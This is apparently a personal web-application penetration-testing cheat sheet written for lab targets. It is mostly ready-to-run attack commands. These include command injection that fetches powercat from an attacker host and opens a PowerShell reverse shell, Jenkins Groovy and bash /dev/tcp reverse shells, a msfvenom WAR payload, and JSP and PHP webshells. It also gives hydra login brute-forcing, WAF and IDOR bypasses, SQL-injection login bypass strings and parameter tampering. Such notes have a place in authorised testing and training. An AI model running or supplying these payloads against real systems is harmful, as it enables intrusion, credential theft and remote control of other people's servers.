If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive # to find out if the commands are executed by CMD or Powershell
```

Given that it's Powershell:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
nc -lvnp 4444
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

#### Web Roots

Linux.

```bash
/var/www/html/
/var/www/
/var/www/app/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/srv/www/
/srv/www/html/
/srv/www/sites/
/home/www/
/home/httpd/
/home/$USER/public_html/
/home/$USER/www/
/home/$USER/app/
/home/$USER/$application_name/
/var/www/$application_name/
```

Windows.

```bash
c:\inetpub\wwwroot\
c:\xampp\htdocs\
c:\wamp\www
```

#### SQL Injection

- Refer to ./sqli.md. Try the authentication bypass fuzzing.

#### Client-Side Attacks

If there if a section where you can mail the company, refer to ../notes/client_side_attacks.md. Also look out for svc, anything where files with Macros can be accepted.

#### Exiftool

Use exiftool to analyze a few documents on the website, see what information you can get. Wget will give you better information than curl.

#### Brute-Force Passwords

Refer to ../notes/password_cracking.md

Additional Resources at "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web".

#### IDOR

Appending another id to the api call to bypass restrictions.

```bash
GET /api/v1/messages?id=<Another_User_ID> # unauthorized
GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
```

#### Retrieve cookie, response headers

```bash
curl -I http://$ip/filemanager/ # (retrieves a fresh cookie)
```

#### WAF Access Denied

Try adding X-Forwarded-For to gain some trust.

```bash
curl -H 'X-Forwarded-For: localhost' http://192.168.193.134:13337/logs
wfuzz -c -z file,/home/kali/repos/offsec/lists/lfi.txt --hc 404,500 -H 'X-Forwarded-For: localhost' 'http://192.168.193.134:13337/logs?file=FUZZ'
curl -X POST -H 'X-Forwarded-For: localhost' -H 'Content-Type: application/json' --data '{"user":"clumsyadmin", "url":";nc -c bash 192.168.45.178 443"}' 'http://192.168.193.134:13337/update'
```

#### Fuzzing Input Paramater

Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
```
ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded'
```

Note that it sends the payload non-url-encoded.


#### Bruteforcing Logins

First try `admin' or '1'='1`

Basic auth.

```bash
hydra -L wordlist.txt -P wordlist.txt -u -f $ip -s $port http-get /
```

Popup Logins.

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt $ip http-get
```

Webapp Login Brute..

If button..

```bash
hydra -l admin -P /usr/share/wordlists/combo.txt -f $ip -s 9443 https-post-form "/Admin/login.php:txtusername=^USER^&txtpassword=^PASS^&btnlogin=Sign+in:Wrong Username and Password"
```

```bash
# Third parameter can be F=html_content or S=html_content, F is inferred
hydra -l admin -P wordlist.txt -f $ip -s $port http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
hydra -V -f -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt -s 80 $ip http-post-form "/index.php:username=^USER^&password=^PASS^:Login failed"
hydra -V -f -l $user -P /usr/share/wordlists/rockyou.txt -s $port $ip http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

Base64 encoded login.

```bash
cewl http://$ip:8081/ -d 8| grep -v CeWL >> custom-wordlist.txt
cewl --lowercase http://$ip:8081/ -d 8| grep -v CeWL  >> custom-wordlist.txt
# -I : ignore any restore files
# -f : stop when a login is found
# -L : username list
# -P : password list
# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values
# C=/ tells hydra to establish session cookies at this URL
# F=403 tells hydra that HTTP 403 means invalid login
hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```

Wordpress.

```bash
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

#### Tomcat

```bash
python tomcat-login.py -H $ip -P http -m /manager/html -p 8080
```

Structure.

```bash
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps # Default webroot & hosts applications
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost

webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml # the juice
    └── lib
    |    └── jdbc_drivers.jar
    └── classes # check for sensitive information
        └── AdminServlet.class   
```

Upload war file.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
```

You can also place a JSP webshell within the archive.

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

#### Jenkins

Exploits are often version specific. 

In the left sidebar, navigate to "Manage Jenkins" > "Script Console", or just go to $rhost:8080/script.

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```bash
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Replace cmd.exe with /bin/bash if needed.

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Code execution.

```bash
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

On local machine.

```bash
stty raw -echo; (echo 'script -qc "/bin/bash" /dev/null';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp 80 && reset
```

Decrypt Jenkins secrets from Groovy.

```bash
println(hudson.util.Secret.decrypt("{...}"))
```

Password spraying.

```bash
python /opt/jenkins_password_spraying.py
```

#### Exposed Git Repo from URL

```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.211.144/.git/
# or
python3 /opt/git-dumper/git_dumper.py http://192.168.211.144/.git .
```

Then, do:

```bash
git log
git show <each commit>
```

Check .htaccess, see if there are any special Headers that you need to supply, check whether there is anything mentioning virtual hosts.

To modify vhost you would switch "Host: 10.10.11.177" to "Host: dev.siteisup.htb".

#### Finding Root Directory

Refer to 'https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/webservers-appservers' for application specific seen locations.

#### phpinfo

Lots of juicy information.

- ServerRoot
- Loaded plugins
- upload_tmp_dir
- file_uploads
- allow_url_include
- extension_dir
- session.*
- Users || /home
- ..

```bash
```

#### Automatically Adding Custom Header in BurpSuite

Go to Proxy > Options > Scroll Down to Match and Replace > Add the header in Replace section

#### Modifying Parameters for Login Portals , BurpSuite

Take the time to review any account login information in BurpSuite. Look at the response.. in the scenario that you're creating a new account and there's an email verification, is there a parameter "confirmed" that decides if it recognizes you? Hijack the email parameter:

```bash
// Before
_method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTziioXABz5UKg8E0pO7qUVlzkDlK6WfwSjluHnkMQ&user%5Bemail%5D=test2%40test.test&commit=Change%20email

//After
_method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
```

```bash
...&confirmed=True
```

#### Stealing Session Cookies

- See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.

#### GraphQL

Navigate to "http://site.com/graphql/". Then, you want to extract information.

```bash
{__schema {
   types {
      name
      kind
      description
      fields {
         name
      }
   }
}}
```

Url encode that, then query it within the url, "http://site.com/graphql?query=%7B__schema%20%7B%0A%20%20%20types%20%7B%0A%20%20%20%20%20%20name%0A%20%20%20%20%20%20kind%0A%20%20%20%20%20%20description%0A%20%20%20%20%20%20fields%20%7B%0A%20%20%20%20%20%20%20%20%20name%0A%20%20%20%20%20%20%7D%0A%20%20%20%7D%0A%7D%7D". Say there's a user object with a password and you want to query what it is, you can do that by putting "{ user { username, password } }"


Example post request.

````
POST /serverinfo HTTP/1.1
Host: 192.168.214.114:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.214.114:8080/serverinfo
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: http://192.168.214.114:8080
Connection: close
Cookie: _forum_on_rails_session=XuJdkOzvkY%2FGvsLTdPUryTm0axW3Bd%2FAVmJACm26u3uZGWKZnGpK4wqlObwLM0XbSDTaylpMHj%2F4T7RWss%2FqRkviuuKxX%2FIWjd1%2BNrsW5K6iPVZZxVfHAYsilSAytzTY5Ri0jaF4FQeYMQ1Tt7NH3UMs57dpyYqrwnGIFSuOueWgLLuKLZYlNXUazlGgSYUut9il%2BVa5BYOeC2LNrJR2IHvSDdMuAuTyik1%2BYmuM7oJ2ylQOE2rz0Qpl2YmRvd8azD%2Frm6LvZnwqMT7GgpcCpZGUVkbUlEEenah9YvLUC7eGFudR21A0KZGs7AcJs4HLzLezy5qpNS%2FwwUChwgrqTyWSE8ggV6E8ksjfw9tQZZCHPi1wwfoLYuasX%2Bos%2FrJfhxDOYx9fhH1m7Ock5KTt--bD0GYoMPTFK2RvBc--fNbrpxQT53InzNaJdcdDRQ%3D%3D
Upgrade-Insecure-Requests: 1

authenticity_token=U%2FJaPjmyotmZ3naPc7Iw%2B5FwSGBkFmr6DlMTJqWmE9a7AX1%2B7HKngOYcEehoo%2F4Xo3NDkGa%2FJK2OzVFYTcpMxA%3D%3D&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.178%2F443+0%3E%261
````

````
POST /db/?clickhouse=localhost&username=admin&db=evil&import= HTTP/1.1
Host: 192.168.193.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.193.109/db/?clickhouse=localhost&username=admin&db=evil&import=
Content-Type: multipart/form-data; boundary=---------------------------399488293235751044031263878276
Content-Length: 623
Origin: http://192.168.193.109
Connection: close
Cookie: adminer_permanent=; adminer_settings=defaults%3D1; adminer_engine=MergeTree; adminer_sid=u78erfhdgia68p3qiul0bicsgn; adminer_key=d146d6a494537a572ef3222fec668a40; adminer_version=4.8.1
Upgrade-Insecure-Requests: 1

-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="sql_file[]"; filename="cmd.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="error_stops"

1
-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="only_errors"

1
-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="token"

738807:409982
-----------------------------399488293235751044031263878276--

````
